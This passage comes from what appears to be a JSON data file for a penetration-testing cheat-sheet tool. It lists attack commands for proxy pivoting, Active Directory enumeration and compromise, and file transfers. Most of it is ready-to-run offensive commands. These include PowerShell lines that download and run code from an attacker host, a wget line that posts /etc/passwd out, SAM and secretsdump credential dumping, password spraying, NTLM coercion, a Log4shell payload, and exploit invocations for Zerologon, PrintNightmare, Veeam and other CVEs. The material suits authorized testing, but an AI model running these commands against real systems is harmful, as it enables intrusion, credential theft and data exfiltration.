        "description": "Open proxy checks with curl, spose.py internal port scanning, and proxychains pivoting.",
        "commands": [
          {
            "desc": "Check for Open Proxy",
            "entries": [
              {
                "subdesc": "If SQUID is open, you can pivot through it to reach internal services",
                "cmd": [
                  "curl --proxy http://<TARGET_IP>:3128 http://127.0.0.1"
                ]
              }
            ]
          },
          {
            "desc": "Scan Internal Ports through SQUID",
            "entries": [
              {
                "subdesc": "Install: git clone https://github.com/aancw/spose.git",
                "cmd": [
                  "python3 spose.py --proxy http://<TARGET_IP>:3128 --target 127.0.0.1"
                ]
              }
            ]
          },
          {
            "desc": "Configure Proxychains for SQUID",
            "entries": [
              {
                "subdesc": "Add to /etc/proxychains.conf",
                "cmd": [
                  "# /etc/proxychains.conf: http <TARGET_IP> 3128"
                ]
              },
              {
                "subdesc": "Tunnel tools through it",
                "cmd": [
                  "proxychains nmap -sT 127.0.0.1"
                ]
              }
            ]
          },
          {
            "desc": "Access Internal Services",
            "entries": [
              {
                "subdesc": "Try common internal ports: 80, 8080, 443, 8443, 8000, 3000, 9090",
                "cmd": [
                  "curl --proxy http://<TARGET_IP>:3128 http://127.0.0.1:8080"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-ade",
        "name": "ActiveDirectoryEnum",
        "description": "Project reference: https://github.com/CasperGN/ActiveDirectoryEnumeration",
        "commands": [
          {
            "desc": "Repository",
            "entries": [
              {
                "subdesc": "Install: pip install ActiveDirectoryEnum",
                "cmd": [
                  "https://github.com/CasperGN/ActiveDirectoryEnumeration"
                ]
              }
            ]
          },
          {
            "desc": "Usage",
            "entries": [
              {
                "subdesc": "Run with --all for full enumeration or pick specific flags",
                "cmd": [
                  "-h, --help            show this help message and exit",
                  "--dc DC               Hostname of the Domain Controller",
                  "-o OUT_FILE, --out-file OUT_FILE",
                  "                      Path to output file. If no path, CWD is assumed (default: None)",
                  "-u USER, --user USER  Username of the domain user to query with. The username has to be domain name as `user@domain.org`",
                  "-s, --secure          Try to estalish connection through LDAPS",
                  "-smb, --smb           Force enumeration of SMB shares on all computer objects fetched",
                  "-kp, --kerberos_preauth",
                  "                      Attempt to gather users that does not require Kerberos preauthentication",
                  "-bh, --bloodhound     Output data in the format expected by BloodHound",
                  "-spn                  Attempt to get all SPNs and perform Kerberoasting",
                  "-sysvol               Search sysvol for GPOs with cpassword and decrypt it",
                  "--all                 Run all checks",
                  "--no-creds            Start without credentials",
                  "--dry-run             Don't execute a test but run as if. Used for testing params etc.",
                  "--exploit EXPLOIT     Show path to PoC exploit code"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-adx",
        "name": "Active Directory Exploitation",
        "description": "enum4linux-ng, CrackMapExec (enumeration, spraying, PTH, SAM dump), impacket, and ldapdomaindump.",
        "commands": [
          {
            "desc": "enum4linux-ng",
            "entries": [
              {
                "subdesc": "Install: pip install enum4linux-ng. Next-gen enum4linux with JSON output",
                "cmd": [
                  "enum4linux-ng -A <TARGET_IP>"
                ]
              }
            ]
          },
          {
            "desc": "CrackMapExec: Enumerate Users",
            "entries": [
              {
                "subdesc": "RID brute-force is more reliable than --users for finding all accounts",
                "cmd": [
                  "crackmapexec smb <TARGET_IP> -u 'guest' -p '' --users",
                  "crackmapexec smb <TARGET_IP> -u guest -p '' --rid-brute"
                ]
              }
            ]
          },
          {
            "desc": "CrackMapExec: Password Policy",
            "entries": [
              {
                "subdesc": "Check lockout threshold before spraying to avoid account lockouts",
                "cmd": [
                  "crackmapexec smb <TARGET_IP> -u '' -p '' --pass-pol"
                ]
              }
            ]
          },
          {
            "desc": "CrackMapExec: Shares & Spider",
            "entries": [
              {
                "subdesc": "List shares then spider for files matching a regex pattern",
                "cmd": [
                  "crackmapexec smb <TARGET_IP> -u guest -p '' --shares",
                  "crackmapexec smb <TARGET_IP> -u guest -p '' --spider <SHARE> --regex .",
                  "crackmapexec smb <TARGET_IP> -u <USER> -p <PASS> -M spider_plus"
                ]
              }
            ]
          },
          {
            "desc": "CrackMapExec: Local Auth",
            "entries": [
              {
                "subdesc": "Authenticate using a local account instead of domain credentials",
                "cmd": [
                  "crackmapexec smb <TARGET_IP> -u 'Administrator' -p '<PASS>' --local-auth"
                ]
              }
            ]
          },
          {
            "desc": "CrackMapExec: Pass The Hash",
            "entries": [
              {
                "subdesc": "Spray an NTLM hash across a subnet to find reused local admin credentials",
                "cmd": [
                  "crackmapexec smb <SUBNET>/24 -u administrator -H 'LMHASH:NTHASH' --local-auth",
                  "crackmapexec smb <SUBNET>/24 -u administrator -H 'NTHASH'"
                ]
              }
            ]
          },
          {
            "desc": "CrackMapExec: Dump SAM",
            "entries": [
              {
                "subdesc": "Extract local password hashes from the SAM database",
                "cmd": [
                  "crackmapexec smb <TARGET_IP> -u '<USER>' -p '<PASS>' --local-auth --sam"
                ]
              }
            ]
          },
          {
            "desc": "impacket",
            "entries": [
              {
                "subdesc": "Install: pip install impacket. Swiss-army knife for AD — secretsdump, GetADUsers, etc.",
                "cmd": [
                  "impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<TARGET_IP>",
                  "impacket-GetADUsers <DOMAIN>/<USER>:<PASS> -dc-ip <TARGET_IP> -all"
                ]
              }
            ]
          },
          {
            "desc": "ldapdomaindump",
            "entries": [
              {
                "subdesc": "Install: pip install ldapdomaindump. Dumps domain info to HTML/JSON/grep-friendly files",
                "cmd": [
                  "ldapdomaindump -u <DOMAIN>\\\\<USER> -p <PASS> <TARGET_IP>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "exploit-filetransfer",
        "name": "File Transfers",
        "description": "Upload and exfiltrate files between attacker and target (Windows: certutil, PS, SMB; Linux: curl, SCP, /dev/tcp).",
        "commands": [
          {
            "desc": "windows: xfreerdp3 Drive Share",
            "entries": [
              {
                "subdesc": "Mount a local folder as a shared drive on the RDP session",
                "cmd": [
                  "xfreerdp3 /v:<TARGET_IP> /u:<USER> /p:<PASS> /dynamic-resolution /drive:stuff,/tmp/stuff"
                ]
              }
            ]
          },
          {
            "desc": "windows: certutil Download",
            "entries": [
              {
                "subdesc": "Built-in Windows binary — often not flagged by basic AV",
                "cmd": [
                  "certutil -f -urlcache -split http://<LHOST>/<FILE> <OUTPUT>"
                ]
              }
            ]
          },
          {
            "desc": "windows: PowerShell Download",
            "entries": [
              {
                "subdesc": "Multiple methods — wget/IWR for file download, IEX for in-memory execution",
                "cmd": [
                  "powershell -c 'wget -Uri http://<LHOST>/<FILE> -OutFile C:\\Windows\\Temp\\<FILE>'",
                  "powershell -c 'IWR -Uri http://<LHOST>/<FILE> -OutFile <PATH>'",
                  "powershell -c 'IEX (New-Object Net.WebClient).downloadString(\"http://<LHOST>/<FILE>\")'",
                  "powershell -c 'IEX(IWR http://<LHOST>/<FILE> -UseBasicParsing)'"
                ]
              }
            ]
          },
          {
            "desc": "windows: Encoded PowerShell",
            "entries": [
              {
                "subdesc": "Base64-encode a PS command to bypass logging/restrictions",
                "cmd": [
                  "echo -n '<powershell-command>' | iconv -f ASCII -t UTF-16LE | base64 | tr -d '\\n'",
                  "powershell.exe -nop -exec bypass -enc <ENCODED-OUTPUT>"
                ]
              }
            ]
          },
          {
            "desc": "windows: Exfiltrate via SMB",
            "entries": [
              {
                "subdesc": "Attacker — start SMB share",
                "cmd": [
                  "impacket-smbserver share $(pwd) -smb2support -user hacker -password hacker123"
                ]
              },
              {
                "subdesc": "Target — connect and copy files",
                "cmd": [
                  "net use \\\\<LHOST>\\share /u:hacker hacker123",
                  "copy <FILE> \\\\<LHOST>\\share\\"
                ]
              }
            ]
          },
          {
            "desc": "linux: Python HTTP Server + curl",
            "entries": [
              {
                "subdesc": "Quickest method — host files, download with curl",
                "cmd": [
                  "python3 -m http.server 80",
                  "curl http://<LHOST>/<FILE> -o <FILE>"
                ]
              }
            ]
          },
          {
            "desc": "linux: SCP (requires SSH access)",
            "entries": [
              {
                "subdesc": "Secure copy file to target over SSH — requires valid credentials",
                "cmd": [
                  "scp <FILE> <USER>@<TARGET_IP>:/tmp"
                ]
              }
            ]
          },
          {
            "desc": "linux: FTP Upload",
            "entries": [
              {
                "subdesc": "Host a writable FTP server on pivot/attacker for file transfers",
                "cmd": [
                  "python3 -m pyftpdlib -w -p 21",
                  "ftp <TARGET_IP>"
                ]
              }
            ]
          },
          {
            "desc": "linux: /dev/tcp Transfer",
            "entries": [
              {
                "subdesc": "Sender",
                "cmd": [
                  "nc -lvnp 7777 < file"
                ]
              },
              {
                "subdesc": "Receiver",
                "cmd": [
                  "cat < /dev/tcp/<SENDER_IP>/7777 > file"
                ]
              }
            ]
          },
          {
            "desc": "linux: Exfiltrate via POST",
            "entries": [
              {
                "subdesc": "Target — send file",
                "cmd": [
                  "wget --post-file=/etc/passwd <LHOST>"
                ]
              },
              {
                "subdesc": "Attacker — listen",
                "cmd": [
                  "nc -lvp 80"
                ]
              }
            ]
          }
        ]
      }
    ]
  },

  /* ─── Phase 4: Active Directory ───────────────────────── */
  {
    "id": "active_directory_exploitation",
    "name": "Active Directory Exploitation",
    "optional": true,
    "items": [
      {
        "id": "active_directory_exploitation__no_creds",
        "name": "No Credentials",
        "description": "Attack paths available without any credentials — network scanning, LLMNR/NBTNS poisoning, anonymous LDAP/SMB access, and Kerberos user enumeration.",
        "commands": [
          {
            "desc": "Scan network",
            "entries": [
              {
                "subdesc": "Vulnerable host",
                "cmd": [
                  "nxc smb <ip_range>",
                  "nmap -sP -p <ip>",
                  "nmap -Pn -sV --top-ports 50 --open <ip>",
                  "nmap -Pn --script smb-vuln* -p139,445 <ip>",
                  "nmap -Pn -sC -sV -oA <output> <ip>",
                  "nmap -Pn -sC -sV -p- -oA <output> <ip>",
                  "nmap -sU -sC -sV -oA <output> <ip>"
                ]
              }
            ]
          },
          {
            "desc": "Find DC IP",
            "entries": [
              {
                "subdesc": "Identify Domain Controller IP via DNS SRV records or Kerberos port scan",
                "cmd": [
                  "nmcli dev show <interface>",
                  "nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>",
                  "nmap -p 88 --open <ip_range>"
                ]
              }
            ]
          },
          {
            "desc": "Zone transfer",
            "entries": [
              {
                "subdesc": "Attempt AXFR to dump all DNS records — often disabled but always worth trying",
                "cmd": [
                  "dig axfr <domain_name> @<name_server>"
                ]
              }
            ]
          },
          {
            "desc": "Anonymous & Guest access on SMB shares",
            "entries": [
              {
                "subdesc": "Test for unauthenticated SMB access — common misconfiguration in AD environments",
                "cmd": [
                  "nxc smb <ip_range> -u '' -p",
                  "nxc smb <ip_range> -u 'a' -p",
                  "enum4linux-ng.py -a -u '' -p '' <ip>",
                  "smbclient -U '%' -L //<ip>"
                ]
              }
            ]
          },
          {
            "desc": "Enumerate LDAP",
            "entries": [
              {
                "subdesc": "Username",
                "cmd": [
                  "nmap -n -sV --script 'ldap*' and not brute -p 389 <dc_ip>",
                  "ldapsearch -x -H <dc_ip> -s base"
                ]
              }
            ]
          },
          {
            "desc": "Enumerate Users",
            "entries": [
              {
                "subdesc": "Username",
                "cmd": [
                  "nxc smb <dc_ip> --users",
                  "nxc smb <dc_ip> --rid-brute 10000 # bruteforcing RID",
                  "net rpc group members 'Domain Users' -W '<domain> -l <ip> -U '%"
                ]
              }
            ]
          },
          {
            "desc": "Bruteforce users",
            "entries": [
              {
                "subdesc": "Username",
                "cmd": [
                  "kerbrute userenum -d <domain> <userlist>",
                  "nmap -p 88 --script=krb5-enum-users --script-args=\"krb5-enum-users.realm= '<domain>',userdb=<user_list_file>\" <dc_ip>"
                ]
              }
            ]
          },
          {
            "desc": "Poisoning",
            "entries": [
              {
                "subdesc": "poisoning SMB || poisoning LDAP || poisoning HTTP",
                "cmd": [
                  "LLMNR / NBTNS / MDNS",
                  "responder -l <interface>",
                  "⚠️ DHCPv6 (IPv6 prefered to IPv4)",
                  "mitm6 -d <domain>",
                  "bettercap",
                  "⚠️ ARP Poisoning",
                  "bettercap",
                  "asreqroast",
                  "Pcredz -i <interface> -v` >>> Hash found ASREQ"
                ]
              }
            ]
          },
          {
            "desc": "Coerce",
            "entries": [
              {
                "subdesc": "Coerce SMB",
                "cmd": [
                  "Unauthenticated PetitPotam (CVE-2022-26925) @CVE@",
                  "petitpotam.py -d <domain> <listener> <target>"
                ]
              }
            ]
          },
          {
            "desc": "PXE",
            "entries": [
              {
                "subdesc": "Extract NAA credentials from PXE boot images — no domain creds required",
                "cmd": [
                  "no password >>> Credentials (NAA account)",
                  "pxethief.py 1",
                  "pxethief.py 2 <distribution_point_ip>",
                  "password protected >>> PXE Hash",
                  "tftp -i <dp_ip> GET \"\\xxx\\boot.var",
                  "pxethief.py 5 '\\xxx\\boot.var"
                ]
              }
            ]
          },
          {
            "desc": "TimeRoasting",
            "entries": [
              {
                "subdesc": "timeroast hash",
                "cmd": [
                  "timeroast.py <dc_ip> -o <output_log>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__valid_user",
        "name": "Valid User (No Password)",
        "description": "Attacks possible with a valid username but no password — AS-REP Roasting, password spraying, and pre-auth enumeration.",
        "commands": [
          {
            "desc": "Password Spray",
            "entries": [
              {
                "subdesc": "ALWAYS check lockout policy first. Common patterns: Season+Year, Company+123",
                "cmd": [
                  "Get password policy  (you need creds,but you should get the policy  first to avoid locking accounts)",
                  "default policy",
                  "nxc smb <dc_ip> -u '<user>' -p '<password>' --pass-pol",
                  "[https://www.thehacker.recipes/ad/recon/password-policy](https://www.thehacker.recipes/ad/recon/password-policy)",
                  "Get-ADDefaultDomainPasswordPolicy",
                  "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> domain_policy",
                  "Fined Policy (Privileged)",
                  "ldapsearch-ad.py --server <dc> -d <domain> -u <user> -p <pass> --type pass-pols",
                  "Get-ADFineGainedPasswordPolicy -filter *",
                  "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> pso # can also be runned with a low priv account but less information will be available",
                  "⚠️ user == password >>> Clear text Credentials",
                  "nxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-success",
                  "sprayhound -U <users.txt> -d <domain> -dc  <dc_ip>   # add --lower to lowercase and --upper to uppercase. Add nothing to get only user=pass",
                  "⚠️ usuals passwords  (SeasonYear!, Company123, ...) >>> Clear text Credentials",
                  "nxc smb <dc_ip> -u <users.txt> -p <password> --continue-on-success",
                  "sprayhound -U <users.txt> -p <password> -d <domain> -dc  <dc_ip>",
                  "kerbrute passwordspray -d <domain> <users.txt> <password>"
                ]
              }
            ]
          },
          {
            "desc": "ASREPRoast",
            "entries": [
              {
                "subdesc": "Target users with Kerberos pre-auth disabled — crack AS-REP hashes offline",
                "cmd": [
                  "List ASREPRoastable Users (need creds)",
                  "MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u",
                  "ASREP roasting >>> Hash found ASREP",
                  "GetNPUsers.py <domain>/ -usersfile <users.txt> -format hashcat -outputfile <output.txt>",
                  "nxc ldap <dc_ip> -u <users.txt>  -p '' --asreproast <output.txt>",
                  "Rubeus.exe asreproast /format:hashcat",
                  "Blind Kerberoasting >>> Hash found TGS",
                  "Rubeus.exe keberoast /domain:<domain> /dc:<dcip> /nopreauth: <asrep_user> /spns:<users.txt>",
                  "GetUserSPNs.py -no-preauth \"<asrep_user>\" -usersfile \"<user_list.txt>\" -dc-host \"<dc_ip>\" \"<domain>\"/",
                  "CVE-2022-33679 @CVE@ >>> Lat move PTT",
                  "CVE-2022-33679.py <domain>/<user> <target>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__authenticated",
        "name": "Valid Credentials",
        "description": "Post-authentication enumeration and attack escalation with valid domain credentials — BloodHound collection, Kerberoasting, Share/GPO/ACL enumeration. Key pip installs: ldeep, man-spider, adidnsdump, coercer, sccmhunter, ad-miner.",
        "commands": [
          {
            "desc": "Classic Enumeration (users, shares, ACL, delegation, ...)",
            "entries": [
              {
                "subdesc": "Run BloodHound first to map attack paths, then enumerate shares, DNS, and LDAP",
                "cmd": [
                  "Find all users >>> Username",
                  "GetADUsers.py -all -dc-ip <dc_ip> <domain>/<username>",
                  "nxc smb <dc_ip> -u '<user>' -p '<password>' --users",
                  "Enumerate SMB share >>> Scroll shares",
                  "nxc smb <ip_range> -u '<user>' -p '<password>' -M spider_plus",
                  "nxc smb <ip_range> -u '<user>' -p '<password>' --shares [--get-file \\\\<filename> <filename>]",
                  "manspider <ip_range> -c passw -e <file extensions> -d <domain> -u <user> -p <password>",
                  "Bloodhound Legacy >>> ACL || Delegation || Username",
                  "bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all",
                  "rusthound -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z",
                  "import-module sharphound.ps1;invoke-bloodhound -collectionmethod all -domain <domain>",
                  "sharphound.exe -c all -d <domain>",
                  "Bloodhound CE >>> ACL || Delegation || Username",
                  "bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all",
                  "rusthound-ce -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z --ldap-filter=(objectGuid=*)",
                  "sharphound.exe -c all -d <domain>",
                  "SOAPHound.exe -c c:\\temp\\cache.txt --bhdump -o c:\\temp\\bloodhound-output --autosplit --threshold 900",
                  "Enumerate Ldap >>> ACL || Delegation || Username",
                  "ldeep ldap -u <users> -p '<password>' -d <domain> -s ldap://<dc_ip> all <backup_folder>",
                  "ldapdomaindump.py -u <user> -p <password> -o <dump_folder> ldap://<dc_ip>:389",
                  "ldapsearch-ad.py -l <dc_ip> -d <domain> -u <user> -p '<password>' -o <output.log> -t all",
                  "Enumerate DNS >>> New targets (low hanging fruit)",
                  "adidnsdump -u <domain>\\\\<user> -p \"<password>\" --print-zones <dc_ip>"
                ]
              }
            ]
          },
          {
            "desc": "Enumerate ADCS",
            "entries": [
              {
                "subdesc": "ADCS Exploitation",
                "cmd": [
                  "certify.exe find",
                  "certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc_ip>"
                ]
              }
            ]
          },
          {
            "desc": "Enumerate SCCM",
            "entries": [
              {
                "subdesc": "SCCM Exploitation",
                "cmd": [
                  "sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug",
                  "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm",
                  "SharpSCCM.exe local site-info"
                ]
              }
            ]
          },
          {
            "desc": "Scan Auto",
            "entries": [
              {
                "subdesc": "Automated vulnerability scanning from BloodHound data — PingCastle for quick health check",
                "cmd": [
                  "from BH result",
                  "AD-miner -c -cf Report -u <neo4j_username> -p <neo4j_password>",
                  "PingCastle.exe --healthcheck --server <domain>",
                  "Import-Module .\\adPEAS.ps1; Invoke-adPEAS -Domain '<domain>' -Server '<dc_fqdn>"
                ]
              }
            ]
          },
          {
            "desc": "Kerberoasting",
            "entries": [
              {
                "subdesc": "Hash TGS",
                "cmd": [
                  "MATCH (u:User) WHERE u.hasspn=true AND u.enabled = true AND NOT u.objectid ENDS WITH '-502' AND NOT COALESCE(u.gmsa, false) = true AND NOT COALESCE(u.msa, false) = true RETURN u",
                  "GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>",
                  "Rubeus.exe kerberoast"
                ]
              }
            ]
          },
          {
            "desc": "Coerce",
            "entries": [
              {
                "subdesc": "Force target to authenticate to your listener — combine with ntlmrelayx for relay attacks",
                "cmd": [
                  "Drop file",
                  ".lnk",
                  "nxc smb <dc_ip> -u '<user>' -p '<password>' -M slinky -o NAME=<filename> SERVER=<attacker_ip>",
                  ".scf",
                  "nxc smb <dc_ip> -u '<user>' -p '<password>' -M sucffy -o NAME=<filename> SERVER=<attacker_ip>",
                  ".url",
                  "[InternetShortcut]... IconFile=\\\\<attacker_ip>\\%USERNAME%.icon",
                  "Other files",
                  "ntlm_theft.py -g all -s <your_ip> -f test",
                  "Webdav",
                  "Enable webclient",
                  ".searchConnector-ms",
                  "nxc smb <dc_ip> -u '<user>' -p '<password>' -M drop-sc",
                  "add attack computer in dns",
                  "dnstool.py -u <domain>\\<user> -p <pass> --record <attack_name> --action add --data <ip_attacker> <dc_ip>",
                  "Launch coerce with <attacker_hostname>@80/x as target >>> HTTP Coerce",
                  "RPC call >>> SMB NTLM Coerce",
                  "printerbug.py <domain>/<username>:<password>@<printer_ip> <listener_ip>",
                  "petitpotam.py -d <domain> -u <user> -p <password> <listnerer_ip> <target_ip>",
                  "coercer.py -d <domain> -u <user> -p <password> -t <target> -l <attacker_ip>",
                  "Coerce kerberos >>> SMB Kerberos coerce",
                  "dnstool.py -u \"<domain>\\<user>\" -p '<password>' -d \"<attacker_ip>\" --action add \"<dns_server_ip>\" -r \"<servername>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\" --tcp",
                  "petitpotam.py -u '<user>' -p '<password>' -d <domain> '<servername>1UWh...' <target>"
                ]
              }
            ]
          },
          {
            "desc": "Intra ID Connect",
            "entries": [
              {
                "subdesc": "MSOL accounts often have DCSync privileges — high-value target",
                "cmd": [
                  "Find MSOL",
                  "nxc ldap <dc_ip> -u '<user>' -p '<password>' -M get-desc-users |grep -i MSOL"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__low_hanging",
        "name": "Quick Compromise",
        "description": "Low-effort high-impact wins — password reuse, Kerberoasting weak SPNs, GPP passwords, LAPS misconfigs, and default credentials.",
        "commands": [
          {
            "desc": "⚠️ Zerologon (unsafe) CVE-2020-1472 @CVE@",
            "entries": [
              {
                "subdesc": "Domain admin",
                "cmd": [
                  "zerologon-scan '<dc_netbios_name>' '<ip>",
                  "cve-2020-1472-exploit.py <MACHINE_BIOS_NAME> <ip>"
                ]
              }
            ]
          },
          {
            "desc": "Eternal Blue MS17-010 @CVE@",
            "entries": [
              {
                "subdesc": "Admin || Low access",
                "cmd": [
                  "msf> exploit/windows/smb/ms17_010_eternalblue # SMBv1 only"
                ]
              }
            ]
          },
          {
            "desc": "Tomcat/Jboss Manager",
            "entries": [
              {
                "subdesc": "Admin || Low access",
                "cmd": [
                  "msf> auxiliary/scanner/http/tomcat_enum",
                  "msf> exploit/multi/http/tomcat_mgr_deploy"
                ]
              }
            ]
          },
          {
            "desc": "Java RMI",
            "entries": [
              {
                "subdesc": "Admin || Low access",
                "cmd": [
                  "msf> use exploit/multi/misc/java_rmi_server"
                ]
              }
            ]
          },
          {
            "desc": "Java Serialiszed port",
            "entries": [
              {
                "subdesc": "Admin || Low access",
                "cmd": [
                  "ysoserial.jar <gadget> '<cmd>' |nc <ip> <port>"
                ]
              }
            ]
          },
          {
            "desc": "Log4shell",
            "entries": [
              {
                "subdesc": "Admin || Low access",
                "cmd": [
                  "${jndi:ldap://<ip>:<port>/o=reference}"
                ]
              }
            ]
          },
          {
            "desc": "Database",
            "entries": [
              {
                "subdesc": "Admin || Low access",
                "cmd": [
                  "msf> use auxiliary/admin/mssql/mssql_enum_sql_logins"
                ]
              }
            ]
          },
          {
            "desc": "Exchange",
            "entries": [
              {
                "subdesc": "Admin",
                "cmd": [
                  "Proxyshell @CVE@",
                  "proxyshell_rce.py -u https://<exchange> -e administrator@<domain>"
                ]
              }
            ]
          },
          {
            "desc": "Veeam",
            "entries": [
              {
                "subdesc": "User Account || Low access || Admin",
                "cmd": [
                  "CVE-2023-27532 (creds - Veeam backup) @CVE@",
                  "VeeamHax.exe --target <veeam_server>",
                  "CVE-2023-27532 net.tcp:/<target>:<port>/",
                  "CVE-2024-29849 (auth bypass - Veeam Backup Enterprise Manager) @CVE@",
                  "CVE-2024-29849.py --target https://<veeam_ip>:<veeam_port>/ --callback-server <attacker_ip>:<port>",
                  "CVE-2024-29855 (auth bypass - Veeam Recovery Orchestrator) @CVE@",
                  "CVE-2024-29855.py  --start_time <start_time_epoch> --end_time <end_time_epoch> --username <user>@<domain> --target https://<veeam_ip>:<veeam_port>/",
                  "CVE-2024-40711 (unserialize - Veeam backup) @CVE@",
                  "CVE-2024-40711.exe -f binaryformatter -g Veeam -c http://<attacker_ip>:8000/trigger --targetveeam <veeam_ip>"
                ]
              }
            ]
          },
          {
            "desc": "GLPI",
            "entries": [
              {
                "subdesc": "Admin || Low access",
                "cmd": [
                  "CVE-2022-35914 @CVE@",
                  "/vendor/htmlawed/htmlawed/htmLawedTest.php",
                  "CVE_2023_41320 @CVE@",
                  "cve_2023_41320.py -u <user> -p <password> -t <ip>"
                ]
              }
            ]
          },
          {
            "desc": "Weak websites / services",
            "entries": [
              {
                "subdesc": "Scan for known web vulnerabilities with automated scanners",
                "cmd": [
                  "nuclei",
                  "nuclei -target <ip_range>",
                  "nessus"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__know_vuln_auth",
        "name": "Known Vulns (Authenticated)",
        "description": "Exploit known AD vulnerabilities with authenticated access — ZeroLogon, PrintNightmare, PetitPotam, noPac, and other CVEs.",
        "commands": [
          {
            "desc": "MS14-068",
            "entries": [
              {
                "subdesc": "PTT >>> Domain admin || Admin",
                "cmd": [
                  "findSMB2UPTime.py <ip>",
                  "ms14-068.py -u <user>@<domain> -p <password> -s <user_sid> -d <dc_fqdn>",
                  "msf> use auxiliary/admin/kerberos/ms14_068_kerberos_checksum",
                  "goldenPac.py -dc-ip <dc_ip> <domain>/<user>:<password>@target"
                ]
              }
            ]
          },
          {
            "desc": "GPP MS14-025",
            "entries": [
              {
                "subdesc": "Domain admin",
                "cmd": [
                  "msf> use auxiliary/scanner/smb/smb_enum_gpp",
                  "findstr /S /I cpassword \\\\<domain_fqdn>\\sysvol\\<domain_fqdn>\\policies\\*.xml",
                  "Get-GPPPassword.py <domain>/<user>:<password>@<dc_fqdn>"
                ]
              }
            ]
          },
          {
            "desc": "PrivExchange (CVE-2019-0724, CVE-2019-0686)",
            "entries": [
              {
                "subdesc": "HTTP Coerce >>> Domain admin || Admin",
                "cmd": [
                  "privexchange.py -ah <attacker_ip> <exchange_host> -u <user> -d <domain> -p <password>"
                ]
              }
            ]
          },
          {
            "desc": "noPac (CVE-2021-42287, CVE-2021-42278)",
            "entries": [
              {
                "subdesc": "PTT >>> DCSYNC >>> Domain admin",
                "cmd": [
                  "nxc smb <ip> -u 'user' -p 'pass' -M nopac #scan",
                  "noPac.exe -domain <domain> -user <user> -pass <password> /dc <dc_fqdn> /mAccount <machine_account> /mPassword <machine_password> /service cifs /ptt"
                ]
              }
            ]
          },
          {
            "desc": "PrintNightmare (CVE-2021-1675, CVE-2021-34527)",
            "entries": [
              {
                "subdesc": "Admin",
                "cmd": [
                  "nxc smb <ip> -u 'user' -p 'pass' -M printnightmare #scan",
                  "printnightmare.py -dll '\\\\<attacker_ip>\\smb\\add_user.dll' '<user>:<password>@<ip>"
                ]
              }
            ]
          },
          {
            "desc": "Certifried (CVE-2022-26923)",
            "entries": [
              {
                "subdesc": "PTT >>> DCSYNC >>> Domain admin",
                "cmd": [
                  "Create account",
                  "certipy account create -u <user>@<domain> -p '<password>' -user 'certifriedpc' -pass 'certifriedpass' -dns '<fqdn_dc>",
                  "Request",
                  "certipy req -u 'certifriedpc$'@<domain> -p 'certifriedpass' -target <ca_fqdn> -ca <ca_name> -template Machine",
                  "Authentication",
                  "certipy auth -pfx <pfx_file> -username '<dc>$' -domain <domain> -dc-ip <dc_ip>"
                ]
              }
            ]
          },
          {
            "desc": "ProxyNotShell (CVE-2022-41040, CVE-2022-41082)",
            "entries": [
              {
                "subdesc": "Admin",
                "cmd": [
                  "poc_aug3.py <host> <username> <password> <command>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "active_directory_exploitation__acl",
        "name": "ACL / ACE Abuse",
        "description": "Exploit misconfigured Access Control Lists — GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, and other dangerous ACEs.",
        "commands": [
          {
            "desc": "Dcsync",
            "entries": [
              {
                "subdesc": "Domain Admin || Lateral move || Crack hash",
                "cmd": [
                  "Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts",
                  "mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\\administrator",
                  "secretsdump.py '<domain>'/'<user>':'<password>'@'<domain_controller>"
                ]
              }
            ]
          },
          {
            "desc": "can change msDS-KeyCredentialLInk (Generic Write) + ADCS",
            "entries": [
              {
                "subdesc": "PassTheCertificate",
                "cmd": [
                  "Shadow Credentials",
                  "certipy shadow auto '-u <user>@<domain>' -p <password> -account '<target_account>",
                  "pywhisker.py -d \"FQDN_DOMAIN\" -u \"user1\" -p \"CERTIFICATE_PASSWORD\" --target \"TARGET_SAMNAME\" --action \"list"
                ]
              }
            ]
          },
          {
            "desc": "On Group",
            "entries": [
              {
                "subdesc": "Add yourself to privileged groups via ACL abuse — check BloodHound for paths",
                "cmd": [
                  "GenericAll/GenericWrite/Self/Add Extended Rights",
                  "Add member to the group",
                  "Write Owner",
                  "Grant Ownership",
                  "WriteDACL + WriteOwner",
                  "Grant rights",
                  "Give yourself generic all"
                ]
              }
            ]
          },
          {
            "desc": "On Computer",
            "entries": [
              {
                "subdesc": "GenericAll/Write on computer = RBCD or Shadow Credentials attack",
                "cmd": [
                  "GenericAll / GenericWrite",
                  "msDs-AllowedToActOnBehalf >>> RBCD",
                  "add Key Credentials >>> shadow credentials"
                ]
              }
            ]
          },
          {
            "desc": "On User",
            "entries": [
              {
                "subdesc": "Change password, set SPN for Kerberoasting, or add shadow credentials",
                "cmd": [
                  "GenericAll / GenericWrite",
                  "Change password",
                  "net user <user> <password> /domain` >>> User with clear text pass",
                  "add SPN (target kerberoasting)",
                  "targetedKerberoast.py -d <domain> -u <user> -p <pass>` >>> Hash found (TGS)",
                  "add key credentials >>> shadow credentials",
                  "login script >>> Access",
